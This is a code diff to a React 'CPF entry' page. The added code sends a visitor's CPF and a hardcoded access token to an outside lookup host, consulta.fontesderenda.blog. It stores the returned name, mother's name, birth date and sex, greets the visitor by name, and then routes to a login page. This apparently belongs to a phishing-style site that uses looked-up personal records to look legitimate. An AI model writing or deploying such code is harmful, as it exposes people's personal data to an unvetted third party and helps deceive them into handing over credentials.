@@ -1,11 +1,23 @@
-
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Input } from '@/components/ui/input';
+import { useToast } from "@/components/ui/use-toast";
+
+interface UserData {
+  DADOS: {
+    cpf: string;
+    nome: string;
+    nome_mae: string;
+    data_nascimento: string;
+    sexo: string;
+  }
+}
 
 const CPFEntry = () => {
   const [cpf, setCpf] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
+  const { toast } = useToast();
 
   const formatCPF = (value: string) => {
     const digits = value.replace(/\D/g, '');
@@ -22,12 +34,59 @@ const CPFEntry = () => {
     setCpf(formatCPF(rawValue));
   };
 
-  const handleNext = (e: React.FormEvent) => {
+  const handleNext = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (cpf.length > 0) {
-      // Store the CPF in localStorage to use it later
+    
+    if (cpf.length < 11) {
+      toast({
+        title: "CPF inválido",
+        description: "Por favor, insira um CPF válido com 11 dígitos.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsLoading(true);
+    
+    try {
+      // Call the API to get user data
+      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${cpf}`);
+      
+      if (!response.ok) {
+        throw new Error('Falha ao consultar CPF');
+      }
+      
+      const data: UserData = await response.json();
+      
+      // Store the full user data in localStorage
+      localStorage.setItem('userData', JSON.stringify(data));
+      
+      // Also keep the CPF separately for compatibility with existing code
       localStorage.setItem('userCPF', cpf);
+      
+      // Show success message
+      toast({
+        title: "CPF verificado",
+        description: `Bem-vindo, ${data.DADOS.nome}`,
+      });
+      
+      // Navigate to login page
       navigate('/login');
+    } catch (error) {
+      console.error('Error fetching user data:', error);
+      
+      // If API fails, we still store the CPF and continue
+      localStorage.setItem('userCPF', cpf);
+      
+      toast({
+        title: "Atenção",
+        description: "Não foi possível verificar todos os dados do CPF, mas você pode continuar.",
+        variant: "destructive",
+      });
+      
+      navigate('/login');
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -71,9 +130,10 @@ const CPFEntry = () => {
 
           <button
             type="submit"
+            disabled={isLoading}
             className="w-full bg-[#FF8C00] text-white py-4 rounded text-lg font-medium hover:bg-opacity-90 transition-all duration-300 mb-8"
           >
-            Próximo
+            {isLoading ? "Verificando..." : "Próximo"}
           </button>
 
           <div className="text-center">
